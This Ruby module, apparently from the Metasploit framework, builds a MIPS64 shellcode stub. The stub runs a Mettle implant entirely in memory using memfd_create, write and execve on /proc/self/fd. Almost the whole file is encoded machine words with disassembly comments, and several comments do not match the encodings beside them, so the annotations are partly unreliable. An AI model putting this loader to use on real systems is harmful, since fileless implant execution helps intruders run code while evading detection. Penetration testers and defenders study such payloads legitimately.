#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
# MIPS64 conventions
#  Literal Zero: r0/$zero
#  Volatile: t0-t7
#  Parameters: a0-a3
#  Syscall offset: v0
#  Return Address: ra
#
module Msf::Payload::Linux::Mips64::ElfLoader
  def in_memory_load(payload)
    size = payload.length
    size_h = size >> 16
    size_l = size & 0x0000ffff
    in_memory_loader = [
      # call next instruction to get relative address
      0x00001025,               #   move    v0,zero
      0x04510000,               #   bgezal  v0,8 <myself>
      0x00000000,               #   nop
      0x00000000,               #   nop
      # memfd_create("", MFD_CLOEXEC) = fd
      0x03e02025,               #   move    a0,ra
      0x27ff00b8,               #   addiu   ra,ra,92
      0x2419fffe,               #   li      t9,-2
      0x03202827,               #   nor     a1,t9,zero
      0x340214c2,               #   li      v0,0x14c2
      0x0101010c,               #   syscall 0x40404
      # write(fd, payload, payload_length)
      0x03e02825,               #   move    a1,ra
      (0x3c06 << 16 | size_h),  #   lui     a2,0x17
      (0x34c6 << 16 | size_l),  #   ori     a2,a2,0x2fb8
      0x00402025,               #   move    a0,v0
      0x0080c825,               #   move    t9,a0
      0x34021389,               #   li      v0,0x1389
      0x0101010c,               #   syscall 0x40404
      # custom implementation of itoa
      0x27e7fffe,               #   addiu   a3,ra,-2
      0x2418000a,               #   li      t8,10
      0x24050016,               #   li      a1,23
      0x13200011,               #   beqz    t9,98 <execve>
      0x00000000,               #   bnez    t8,60 <itoa+0x10>
      0x0338001a,               #   div     zero,t9,t8
      0x00000000,               #   break   0x7
      0x2401ffff,               #   li      at,-1
      0x17010004,               #   bne     t8,at,78 <itoa+0x28>
      0x3c018000,               #   lui     at,0x8000
      0x17210002,               #   bne     t9,at,78 <itoa+0x28>
      0x00000000,               #   nop
      0x00000000,               #   break   0x6
      0x0000c812,               #   mflo    t9
      0x0000c812,               #   mflo    t9
      0x00007810,               #   mfhi    t3
      0x25ef0030,               #   addiu   t3,t3,48
      0xa0ef0000,               #   sb      t3,0(a3)
      0x24a5ffff,               #   addiu   a1,a1,-1
      0x24e7ffff,               #   addiu   a3,a3,-1
      0x1000ffee,               #   b       50 <itoa>
      0x00e52022,               #   sub     a0,a3,a1
      0x2805ffff,               #   slti    a1,zero,-1
      0x2806ffff,               #   slti    a2,zero,-1
      0x340213c1,               #   li      v0,0xfab
      # execve('/proc/self/fd//////<fd>', 0, 0)
      0x0101010c,               #   syscall 0x40404
      0x2f70726f,               #   sltiu   s0,k1,29295
      0x632f7365,               #   daddi   t3,t9,29541
      0x6c662f66,               #   ldr     a2,12134(v1)
      0x642f2f2f,               #   daddiu  t3,at,12079
      0x2f2f2f2f,               #   sltiu   t3,t9,12079
      0x2f2f2f00,               #   sltiu   t3,t9,12032
    ].pack('N*')
    in_memory_loader
  end
end
